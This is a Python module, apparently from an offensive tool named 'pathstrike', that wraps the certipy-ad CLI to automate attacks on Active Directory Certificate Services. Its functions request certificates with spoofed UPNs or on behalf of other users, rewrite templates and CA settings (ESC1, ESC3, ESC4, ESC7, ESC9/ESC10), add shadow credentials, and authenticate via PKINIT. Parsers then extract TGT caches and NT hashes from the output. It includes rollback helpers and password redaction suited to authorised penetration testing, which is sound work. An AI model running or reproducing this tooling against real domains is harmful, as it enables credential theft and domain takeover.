"""Async subprocess wrapper for the certipy-ad CLI tool.

certipy-ad is used for Active Directory Certificate Services (AD CS)
exploitation: template enumeration, certificate requests, PKINIT auth,
shadow credentials, template modification, and account UPN manipulation.

Subcommands: find, req, auth, ca, template, forge, shadow, account

Every public function returns a standardised result dict::

    {
        "success": bool,
        "output": str,          # raw stdout
        "parsed": dict | None,  # extracted structured data when available
        "error": str | None,    # stderr or exception message
    }
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
import shlex
from pathlib import Path
from typing import Any

logger = logging.getLogger("pathstrike.tools.certipy")

_SENSITIVE_FLAGS = {"-p", "-password", "--password", "-hashes", "-aes", "-pfx-password"}


def _redact_cmd(cmd: list[str]) -> str:
    """Redact sensitive arguments from a command list for logging."""
    redacted = []
    skip_next = False
    for i, arg in enumerate(cmd):
        if skip_next:
            redacted.append("***REDACTED***")
            skip_next = False
        elif arg in _SENSITIVE_FLAGS and i + 1 < len(cmd):
            redacted.append(arg)
            skip_next = True
        else:
            redacted.append(arg)
    return " ".join(shlex.quote(c) for c in redacted)


# ---------------------------------------------------------------------------
# Core runner
# ---------------------------------------------------------------------------


async def run_certipy(
    subcommand: str,
    args: list[str],
    timeout: int = 60,
) -> dict[str, Any]:
    """Run a certipy-ad command and return parsed output.

    Subcommands supported: ``find``, ``req``, ``auth``, ``ca``, ``template``,
    ``forge``, ``shadow``, ``account``.

    Args:
        subcommand: The certipy subcommand to invoke.
        args: Additional CLI arguments for the subcommand.
        timeout: Maximum seconds to wait for the subprocess.

    Returns:
        Standardised result dict with ``success``, ``output``, ``parsed``,
        and ``error`` keys.
    """
    from pathstrike.engine.time_sync import get_faketime_prefix

    cmd = get_faketime_prefix() + ["certipy", subcommand] + args
    logger.debug("Executing: %s", _redact_cmd(cmd))

    result: dict[str, Any] = {
        "success": False,
        "output": "",
        "parsed": None,
        "error": None,
        "tool": "certipy",
        "command": " ".join(shlex.quote(c) for c in cmd),
    }

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )

        stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
        stderr = stderr_bytes.decode("utf-8", errors="replace").strip()

        result["output"] = stdout
        result["stderr"] = stderr
        result["return_code"] = proc.returncode

        if proc.returncode != 0:
            # Short 1-line summary goes to `error` (surfaces in handler
            # messages + the Rich step table).  Full stderr stays in the
            # session log file only, to avoid flooding the console
            # mid-Live-render.
            short_err = _extract_certipy_error(stderr) or (
                f"certipy {subcommand} exited with code {proc.returncode}"
            )
            result["error"] = short_err
            result["full_stderr"] = stderr
            logger.debug(
                "certipy %s failed (rc=%d): %s\n--- full stderr ---\n%s",
                subcommand, proc.returncode, short_err, stderr,
            )
            return result

        # Attempt to extract structured data from the output
        result["parsed"] = _parse_certipy_output(subcommand, stdout)
        result["success"] = True
        logger.debug("certipy %s succeeded: %s", subcommand, stdout[:200])

    except asyncio.TimeoutError:
        result["error"] = f"certipy {subcommand} timed out after {timeout}s"
        result["error_type"] = "timeout"
        logger.warning(result["error"])
    except FileNotFoundError:
        result["error"] = (
            "certipy binary not found. Install via: pip install certipy-ad"
        )
        result["error_type"] = "tool_not_found"
        logger.error(result["error"])  # real config error — keep at ERROR
    except OSError as exc:
        result["error"] = f"OS error launching certipy: {exc}"
        result["error_type"] = "os_error"
        logger.warning(result["error"])

    return result


def _extract_certipy_error(stderr: str) -> str | None:
    """Pull a useful one-line error message from certipy stderr.

    Certipy prints structured ``[!] ...`` / ``[-] ...`` lines when things
    fail.  Pick the most informative one (last non-empty line that starts
    with ``[-]`` or contains ``Error``); fall back to the last line.
    """
    if not stderr:
        return None
    lines = [ln.rstrip() for ln in stderr.splitlines() if ln.strip()]
    if not lines:
        return None
    for line in reversed(lines):
        if line.startswith("[-]") or "Error" in line or "failed" in line.lower():
            return line.strip("[-] ").strip()[:300]
    return lines[-1][:300]


# ---------------------------------------------------------------------------
# Output parsing helpers
# ---------------------------------------------------------------------------


def _parse_certipy_output(subcommand: str, stdout: str) -> dict[str, Any] | None:
    """Attempt to extract structured data from certipy stdout.

    Different subcommands produce different output formats. This function
    dispatches to specialised parsers where possible.
    """
    parsers: dict[str, Any] = {
        "find": _parse_find_output,
        "req": _parse_req_output,
        "auth": _parse_auth_output,
        "shadow": _parse_shadow_output,
        "template": _parse_template_output,
        "account": _parse_account_output,
    }
    parser = parsers.get(subcommand)
    if parser:
        return parser(stdout)
    return None


def _try_load_json_file(pattern: str, stdout: str) -> dict[str, Any] | None:
    """Try to load a JSON file referenced in certipy output."""
    match = re.search(pattern, stdout)
    if match:
        json_path = Path(match.group(1))
        if json_path.exists():
            try:
                return json.loads(json_path.read_text(encoding="utf-8"))
            except (json.JSONDecodeError, OSError):
                pass
    return None


def _parse_find_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy find`` output.

    certipy find writes results to a JSON file and optionally a BloodHound
    zip file. Extract paths and any vulnerability counts from stdout.
    """
    parsed: dict[str, Any] = {}

    # Look for the JSON output file path
    json_match = re.search(r"Saved JSON output to '(.+?\.json)'", stdout)
    if json_match:
        parsed["json_path"] = json_match.group(1)

    # Look for BloodHound zip
    zip_match = re.search(r"Saved BloodHound data to '(.+?\.zip)'", stdout)
    if zip_match:
        parsed["bloodhound_zip"] = zip_match.group(1)

    # Look for TXT output
    txt_match = re.search(r"Saved text output to '(.+?\.txt)'", stdout)
    if txt_match:
        parsed["txt_path"] = txt_match.group(1)

    # Count vulnerable templates mentioned
    vuln_templates = re.findall(r"ESC\d+", stdout)
    if vuln_templates:
        parsed["vulnerabilities"] = list(set(vuln_templates))

    return parsed if parsed else None


def _parse_req_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy req`` output to extract the PFX path."""
    parsed: dict[str, Any] = {}

    # certipy req writes: "Saved certificate and private key to '<name>.pfx'"
    pfx_match = re.search(r"Saved certificate and private key to '(.+?\.pfx)'", stdout)
    if pfx_match:
        parsed["pfx_path"] = pfx_match.group(1)

    # Check for request ID (useful for pending requests)
    reqid_match = re.search(r"Request ID is (\d+)", stdout)
    if reqid_match:
        parsed["request_id"] = int(reqid_match.group(1))

    # Check for success indicators
    if "Successfully" in stdout or pfx_match:
        parsed["requested"] = True

    return parsed if parsed else None


def _parse_auth_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy auth`` output to extract TGT and NT hash.

    certipy auth performs PKINIT authentication and optionally performs
    UnPAC-the-hash to recover the NT hash.
    """
    parsed: dict[str, Any] = {}

    # NT hash extraction
    nt_match = re.search(r"NT hash.*?:\s*([a-fA-F0-9]{32})", stdout)
    if nt_match:
        parsed["nt_hash"] = nt_match.group(1).lower()

    # ccache file path
    ccache_match = re.search(r"Saved credential cache to '(.+?\.ccache)'", stdout)
    if ccache_match:
        parsed["ccache_path"] = ccache_match.group(1)

    # UPN / principal from the certificate
    upn_match = re.search(r"Using principal: (.+)", stdout)
    if upn_match:
        parsed["principal"] = upn_match.group(1).strip()

    # TGT received indicator
    if "Got TGT" in stdout or ccache_match:
        parsed["tgt_obtained"] = True

    return parsed if parsed else None


def _parse_shadow_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy shadow`` output for device ID and cert paths."""
    parsed: dict[str, Any] = {}

    # Device ID from shadow credentials addition
    device_match = re.search(r"Device ID: ([a-fA-F0-9-]+)", stdout, re.IGNORECASE)
    if device_match:
        parsed["device_id"] = device_match.group(1)

    # PFX path from shadow auto/add
    pfx_match = re.search(r"Saved certificate and private key to '(.+?\.pfx)'", stdout)
    if pfx_match:
        parsed["pfx_path"] = pfx_match.group(1)

    # NT hash from shadow auto (performs full chain)
    nt_match = re.search(r"NT hash.*?:\s*([a-fA-F0-9]{32})", stdout)
    if nt_match:
        parsed["nt_hash"] = nt_match.group(1).lower()

    # ccache from shadow auto
    ccache_match = re.search(r"Saved credential cache to '(.+?\.ccache)'", stdout)
    if ccache_match:
        parsed["ccache_path"] = ccache_match.group(1)

    return parsed if parsed else None


def _parse_template_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy template`` output for saved configuration."""
    parsed: dict[str, Any] = {}

    # Old template config backup path
    old_match = re.search(r"Saved old configuration.*?'(.+?\.json)'", stdout)
    if old_match:
        parsed["old_config_path"] = old_match.group(1)

    if "Successfully" in stdout:
        parsed["modified"] = True

    return parsed if parsed else None


def _parse_account_output(stdout: str) -> dict[str, Any] | None:
    """Parse ``certipy account`` output for UPN changes."""
    parsed: dict[str, Any] = {}

    old_upn_match = re.search(r"Old UPN: (.+)", stdout)
    if old_upn_match:
        parsed["old_upn"] = old_upn_match.group(1).strip()

    new_upn_match = re.search(r"New UPN: (.+)", stdout)
    if new_upn_match:
        parsed["new_upn"] = new_upn_match.group(1).strip()

    if "Successfully" in stdout:
        parsed["modified"] = True

    return parsed if parsed else None


# ---------------------------------------------------------------------------
# Convenience functions
# ---------------------------------------------------------------------------


async def certipy_find(
    target: str,
    auth_args: list[str],
    vulnerable: bool = True,
    stdout: bool = False,
    timeout: int = 120,
) -> dict[str, Any]:
    """Find certificate templates and CAs, optionally filtering for vulnerabilities.

    Args:
        target: Domain controller host or IP.
        auth_args: Authentication arguments (``-u``, ``-p``, etc.).
        vulnerable: If ``True``, add the ``-vulnerable`` flag to filter results.
        stdout: If ``True``, add ``-stdout`` to print output directly.
        timeout: Maximum seconds to wait.

    Returns:
        Result dict. On success, ``parsed`` may contain paths to output files
        and a list of detected vulnerability classes.
    """
    args = ["-dc-ip", target] + auth_args
    if vulnerable:
        args.append("-vulnerable")
    if stdout:
        args.append("-stdout")

    return await run_certipy("find", args, timeout=timeout)


async def certipy_request(
    target: str,
    ca: str,
    template: str,
    auth_args: list[str],
    upn: str | None = None,
    on_behalf_of: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Request a certificate from a Certificate Authority.

    Args:
        target: Domain controller host or IP.
        ca: Certificate Authority name (e.g. ``"CORP-CA"``).
        template: Certificate template name.
        auth_args: Authentication arguments.
        upn: Alternate UPN to specify in the SAN (ESC1/ESC6 exploitation).
        on_behalf_of: Request certificate on behalf of another user (ESC3).

    Returns:
        Result dict. On success, ``parsed["pfx_path"]`` contains the PFX output path.
    """
    args = ["-target", target, "-ca", ca, "-template", template] + auth_args

    if upn:
        args.extend(["-upn", upn])
    if on_behalf_of:
        args.extend(["-on-behalf-of", on_behalf_of])

    return await run_certipy("req", args, timeout=timeout)


async def certipy_auth(
    pfx_path: str,
    dc_ip: str,
    domain: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Authenticate with a certificate via PKINIT to obtain a TGT and NT hash.

    This performs the full PKINIT + UnPAC-the-hash flow:
    1. Authenticate to the KDC using the certificate in the PFX file
    2. Obtain a TGT (saved as a ccache file)
    3. Recover the NT hash via U2U (UnPAC-the-hash)

    Args:
        pfx_path: Path to the PFX certificate file.
        dc_ip: Domain controller IP address.
        domain: Optional domain name override.

    Returns:
        Result dict. On success, ``parsed`` contains ``nt_hash``, ``ccache_path``,
        and ``tgt_obtained`` keys.
    """
    args = ["-pfx", pfx_path, "-dc-ip", dc_ip]
    if domain:
        args.extend(["-domain", domain])

    return await run_certipy("auth", args, timeout=timeout)


async def certipy_shadow(
    subaction: str,
    target: str,
    account: str,
    auth_args: list[str],
    device_id: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Perform shadow credentials operations.

    Shadow credential subactions:
    - ``auto``: Add key credential, authenticate, recover NT hash (full chain)
    - ``add``: Add a key credential to the target account
    - ``remove``: Remove a key credential by device ID
    - ``list``: List all key credentials on the target account
    - ``clear``: Remove all key credentials from the target account

    Args:
        subaction: One of ``auto``, ``add``, ``remove``, ``list``, ``clear``.
        target: Domain controller host or IP.
        account: Target account sAMAccountName.
        auth_args: Authentication arguments.
        device_id: Device ID for the ``remove`` subaction.

    Returns:
        Result dict. For ``auto``/``add``, ``parsed`` may contain ``device_id``,
        ``pfx_path``, ``nt_hash``, and ``ccache_path``.
    """
    valid_subactions = ("auto", "add", "remove", "list", "clear")
    if subaction not in valid_subactions:
        return {
            "success": False,
            "output": "",
            "parsed": None,
            "error": f"Invalid shadow subaction '{subaction}'. Must be one of: {valid_subactions}",
        }

    args = [subaction, "-target", target, "-account", account] + auth_args
    if device_id:
        args.extend(["-device-id", device_id])

    return await run_certipy("shadow", args, timeout=timeout)


async def certipy_template(
    target: str,
    template: str,
    auth_args: list[str],
    save_old: bool = True,
    configuration: dict[str, Any] | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Modify a certificate template configuration.

    Used in ESC4 exploitation to make a template vulnerable, and in rollback
    to restore the original configuration.

    Args:
        target: Domain controller host or IP.
        template: Certificate template name.
        auth_args: Authentication arguments.
        save_old: If ``True``, save the old template configuration to a JSON file.
        configuration: Optional JSON configuration file path to apply (for restore).

    Returns:
        Result dict. On success, ``parsed["old_config_path"]`` may contain
        the path to the saved original configuration.
    """
    args = ["-target", target, "-template", template] + auth_args

    if save_old:
        # certipy uses -save-configuration <file>, not -save-old
        args.extend(["-save-configuration", f"{template}_backup.json"])
    if configuration:
        config_path = configuration.get("config_path")
        if config_path:
            # certipy uses -write-configuration, not -configuration
            args.extend(["-write-configuration", config_path])

    return await run_certipy("template", args, timeout=timeout)


async def certipy_account(
    target: str,
    user: str,
    auth_args: list[str],
    action: str = "update",
    upn: str | None = None,
    old_upn: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Manage an account's attributes (UPN, SPN, etc.) for ESC9/ESC10 attacks.

    certipy account requires a sub-action: ``update``, ``read``, ``create``,
    or ``delete``.

    Args:
        target: Domain controller host or IP.
        user: Target account sAMAccountName to modify.
        auth_args: Authentication arguments.
        action: Account sub-action (``update``, ``read``, ``create``, ``delete``).
        upn: New UPN to set on the target account.
        old_upn: Previous UPN to restore (used in rollback).

    Returns:
        Result dict. On success, ``parsed`` contains ``old_upn`` and ``new_upn``.
    """
    args = [action, "-target", target, "-user", user] + auth_args

    if upn:
        args.extend(["-upn", upn])

    return await run_certipy("account", args, timeout=timeout)


async def certipy_ca(
    target: str,
    ca: str,
    auth_args: list[str],
    enable_template: str | None = None,
    disable_template: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Manage Certificate Authority configuration.

    Can enable/disable certificate templates on the CA, which is useful
    for ESC7-style attacks and rollback operations.

    Args:
        target: Domain controller host or IP.
        ca: Certificate Authority name.
        auth_args: Authentication arguments.
        enable_template: Template name to enable on the CA.
        disable_template: Template name to disable on the CA.

    Returns:
        Result dict.
    """
    args = ["-target", target, "-ca", ca] + auth_args

    if enable_template:
        args.extend(["-enable-template", enable_template])
    if disable_template:
        args.extend(["-disable-template", disable_template])

    return await run_certipy("ca", args, timeout=timeout)


async def certipy_ca_officer(
    ca_name: str,
    template_name: str | None = None,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    dc_ip: str | None = None,
    enable: bool = True,
    timeout: int = 60,
) -> dict[str, Any]:
    """Manage certificate authority officer operations via certipy.

    Used for ESC7 exploitation where the attacker has CA Officer privileges
    and needs to enable/disable certificate templates or approve pending
    certificate requests.

    Args:
        ca_name: Name of the Certificate Authority.
        template_name: Template to enable/disable (if applicable).
        domain: AD domain name.
        username: Authenticating username.
        password: Password for authentication.
        dc_ip: Domain controller IP address.
        enable: If True, enable the template; if False, disable it.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict with parsed certipy output.
    """
    args: list[str] = ["-ca", ca_name]

    if template_name:
        flag = "-enable-template" if enable else "-disable-template"
        args.extend([flag, template_name])

    if domain:
        args.extend(["-domain", domain])
    if username:
        args.extend(["-username", username])
    if password:
        args.extend(["-password", password])
    if dc_ip:
        args.extend(["-dc-ip", dc_ip])

    return await run_certipy("ca", args, timeout=timeout)
